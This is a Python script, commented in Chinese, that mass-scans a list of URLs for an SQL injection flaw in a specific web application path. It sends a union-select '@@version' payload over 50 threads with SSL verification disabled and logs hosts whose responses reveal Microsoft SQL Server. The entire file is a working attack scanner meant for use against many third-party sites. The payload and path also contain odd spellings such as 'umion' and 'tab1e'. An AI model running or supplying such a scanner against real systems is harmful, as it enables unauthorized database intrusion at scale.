import requests
import threading
from urllib.parse import urljoin
import urllib3
import time

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

file_lock = threading.Lock()

def check_sql_injection(url):
    try:
        # 构建目标URL
        target_path = "/BuAdjust/ataRule/DataRule XLHTTP.aspx/?ywtype=getFieldxil&tab1e=-1%27%20umion%20select%20@@version"
        target_url = urljoin(url.strip(), target_path)
        
        # 设置请求头
        headers = {
            'User-Agent': 'Mozilla/4.0(compatible:MSIE 8.0: Windows NT 6.1)',
            'Accept-Encoding': 'gzip,deflate',
            'Accept': '*/*',
            'Connection': 'close'
        }
        
        # 发送GET请求，禁用SSL验证
        response = requests.get(
            target_url, 
            headers=headers, 
            verify=False, 
            timeout=10,
            allow_redirects=False 
        )
        
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
        elif response.status_code == 200:
            if "Microsoft SQL Server" in response.text:
                result_msg = f"[VULNERABLE] {target_url}\n状态码: {response.status_code}\n响应包含: Microsoft SQL Server\n检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'-'*50}\n"
                
                with file_lock:
                    with open("result.txt", "a", encoding="utf-8") as f:
                        f.write(result_msg)
                print(f"[SUCCESS] {url} - 存在SQL注入漏洞，详情已写入result.txt")
            else:
                print(f"[INFO] {url} - 状态码 200，但响应不包含Microsoft SQL Server，漏洞不存在")
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
    except Exception as e:
        print(f"[ERROR] {url} - 发生未知错误: {str(e)}")

def main():
    try:
        with open("url.txt", "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("url.txt文件中没有找到有效的URL")
            return
        
        print(f"开始检测，共 {len(urls)} 个URL，线程数: 50")

        threads = []
        max_threads = 50

        for i in range(0, len(urls), max_threads):
            batch_urls = urls[i:i + max_threads]

            for url in batch_urls:
                thread = threading.Thread(target=check_sql_injection, args=(url,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            threads.clear()

            time.sleep(0.5)
        
        print("所有URL检测完成")
        
    except FileNotFoundError:
        print("错误: 未找到url.txt文件")
    except Exception as e:
        print(f"发生错误: {str(e)}")

if __name__ == "__main__":

    open("result.txt", "w").close()

    start_time = time.time()
    
    main()

    end_time = time.time()
    print(f"总耗时: {end_time - start_time:.2f} 秒")